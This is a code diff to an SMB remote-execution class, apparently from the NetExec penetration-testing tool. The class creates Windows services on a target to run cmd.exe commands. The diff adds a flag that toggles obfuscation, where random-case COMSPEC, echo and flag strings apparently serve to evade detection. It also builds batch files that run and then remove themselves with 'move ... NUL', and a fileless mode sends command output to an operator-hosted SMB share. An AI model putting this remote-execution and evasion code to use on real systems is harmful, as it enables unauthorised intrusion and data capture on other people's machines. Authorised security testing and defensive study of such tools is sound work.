@@ -15,7 +15,7 @@ def randomize_case(s):
 
 
 class SMBEXEC:
-    def __init__(self, host, share_name, smbconnection, username="", password="", domain="", doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, share=None, port=445, logger=None, tries=None):
+    def __init__(self, host, share_name, smbconnection, username="", password="", domain="", doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, share=None, port=445, logger=None, tries=None, nobfs=False, no_delays=False):
         self.__host = host
         self.__share_name = share_name
         self.__port = port
@@ -35,7 +35,7 @@ class SMBEXEC:
         self.__output = None
         self.__batchFile = None
         self.__outputBuffer = b""
-        self.__shell = "%COMSPEC% /Q /c "
+        self.__shell = "%COMSPEC% /q /c "
         self.__retOutput = False
         self.__rpctransport = None
         self.__scmr = None
@@ -45,8 +45,8 @@ class SMBEXEC:
         self.__kdcHost = kdcHost
         self.__tries = tries
         self.logger = logger
-        # Get no_delays parameter from logger.args if available, default to False if not
-        self.__no_delays = getattr(logger, 'args', {}).get('no_delays', False) if hasattr(logger, 'args') else False
+        self.__no_delays = no_delays
+        self.__nobfs = nobfs
 
         if hashes is not None:
             # This checks to see if we didn't provide the LM Hash
@@ -113,32 +113,41 @@ class SMBEXEC:
         self.__output = f"{base_name}_out"
         self.__batchFile = f"{base_name}_batch.bat"
 
-        # Randomize COMSPEC capitalization for obfuscation
-        comspec_var = f"%{randomize_case('COMSPEC')}%".strip('%') # Remove % temporarily for f-string parsing
-        # Randomize other keywords, flags, and env vars
-        echo_cmd = randomize_case('echo')
-        del_cmd = randomize_case('del') # We'll replace this with move later, but keep randomization logic
-        move_cmd = randomize_case('move')
-        q_flag = randomize_case('/Q')
-        c_flag = randomize_case('/c')
-        localappdata_var = f"%{randomize_case('LOCALAPPDATA')}%".strip('%')
-        computername_var = f"%{randomize_case('COMPUTERNAME')}%".strip('%')
+        # Determine strings based on nobfs flag
+        if self.__nobfs:
+            comspec_final = "cmd.exe"  # Use cmd.exe directly
+            echo_val = "echo"
+            move_val = "move"
+            q_flag_val = "/q" # Use lowercase /q
+            c_flag_val = "/c"
+            localappdata_final = "%LOCALAPPDATA%" # Standard env var usage
+        else:
+            comspec_final = f"%{randomize_case('COMSPEC')}%"
+            echo_val = randomize_case('echo')
+            move_val = randomize_case('move')
+            q_flag_val = randomize_case('/q') # Randomize lowercase /q
+            c_flag_val = randomize_case('/c')
+            localappdata_final = f"%{randomize_case('LOCALAPPDATA')}%"
 
-        # Re-add % for the final command string
-        comspec_var = f'%{comspec_var}%'
-        localappdata_var = f'%{localappdata_var}%'
-        computername_var = f'%{computername_var}%'
+        delete_logic = f"{move_val} /y {localappdata_final}\\\\{self.__batchFile} NUL"
+        string_to_echo_into_batch = f"{data} ^> \\\\127.0.0.1\\{self.__share}\\{self.__output} 2^>^&1"
 
-        # Use move /y ... NUL instead of del
-        delete_logic = f"{move_cmd} /y {localappdata_var}\\{self.__batchFile} NUL"
+        if self.__retOutput:
+            command = (
+                f"{comspec_final} {q_flag_val} {c_flag_val} {echo_val} {string_to_echo_into_batch} > {localappdata_final}\\\\{self.__batchFile} & "
+                f"{comspec_final} {q_flag_val} {c_flag_val} {localappdata_final}\\\\{self.__batchFile} & "
+                f"{comspec_final} {q_flag_val} {c_flag_val} {delete_logic}"
+            )
+        else:
+            command = f"{comspec_final} {q_flag_val} {c_flag_val} {data}"
 
-        command = f"{comspec_var} {q_flag} {c_flag} {echo_cmd} {data} ^> \\\\{computername_var}\\{self.__share}\\{self.__output} 2^>^&1 > {localappdata_var}\\{self.__batchFile} & {comspec_var} {q_flag} {c_flag} {localappdata_var}\\{self.__batchFile} & {comspec_var} {q_flag} {c_flag} {delete_logic}" if self.__retOutput else f"{comspec_var} {q_flag} {c_flag} {data}"
-
+        # The local file at TMP_PATH is not directly used by the remote service in this method.
+        # It's more of a placeholder or for other potential uses not realized here.
         with open(path_join(TMP_PATH, self.__batchFile), "w") as batch_file:
-            batch_file.write(command)
+            pass # Not writing `command` or `string_to_echo_into_batch` here for `execute_remote`.
 
-        self.logger.debug("Hosting batch file with command: " + command)
-        self.logger.debug("Command to execute: " + command)
+        self.logger.debug(f"Content to be echoed into remote batch file: {string_to_echo_into_batch}")
+        self.logger.debug(f"Service lpBinaryPathName: {command}")
         self.logger.debug(f"Remote service {self.__serviceName} created.")
 
         try:
@@ -238,23 +247,29 @@ class SMBEXEC:
         self.__output = f"{base_name}_out"
         self.__batchFile = f"{base_name}_batch.bat"
 
-        # Randomize COMSPEC capitalization for obfuscation
-        comspec_var = f"%{randomize_case('COMSPEC')}%".strip('%') # Remove % temporarily for f-string parsing
-        # Randomize flags
-        q_flag = randomize_case('/Q')
-        c_flag = randomize_case('/c')
-        # Re-add % for the final command string
-        comspec_var = f'%{comspec_var}%'
+        # Determine strings based on nobfs flag
+        if self.__nobfs:
+            comspec_final = "cmd.exe" # Use cmd.exe directly
+            q_flag_val = "/q" # Use lowercase /q
+            c_flag_val = "/c"
+        else:
+            comspec_final = f"%{randomize_case('COMSPEC')}%"
+            q_flag_val = randomize_case('/q') # Randomize lowercase /q
+            c_flag_val = randomize_case('/c')
 
         local_ip = self.__rpctransport.get_socket().getsockname()[0]
 
-        # Command written to the local batch file (uses echo)
-        local_batch_command = f"{comspec_var} {q_flag} {c_flag} {data} ^> \\\\{local_ip}\\{self.__share_name}\\{self.__output}" if self.__retOutput else f"{comspec_var} {q_flag} {c_flag} {data}"
-        with open(path_join(TMP_PATH, self.__batchFile), "w") as batch_file:
-            batch_file.write(local_batch_command)
+        # This local_batch_command becomes the lpBinaryPathName for the service in this fileless method.
+        # Output is redirected to the NXC-hosted SMB share.
+        local_batch_command = f"{comspec_final} {q_flag_val} {c_flag_val} {data} ^> \\\\{local_ip}\\{self.__share_name}\\{self.__output}" if self.__retOutput else f"{comspec_final} {q_flag_val} {c_flag_val} {data}"
 
-        self.logger.debug("Hosting batch file with command: " + local_batch_command)
-        self.logger.debug("Command to execute: " + local_batch_command)
+        # For the fileless method, the file at TMP_PATH is what NXC's SMB server will serve.
+        # This file should contain the raw commands to be executed, which is just `data`.
+        with open(path_join(TMP_PATH, self.__batchFile), "w") as batch_file:
+            batch_file.write(data)
+
+        self.logger.debug(f"Service lpBinaryPathName (fileless): {local_batch_command}")
+        self.logger.debug(f"Content of {path_join(TMP_PATH, self.__batchFile)} for NXC SMB server: {data}")
 
         # Introduce delay before creating service
         if not self.__no_delays:
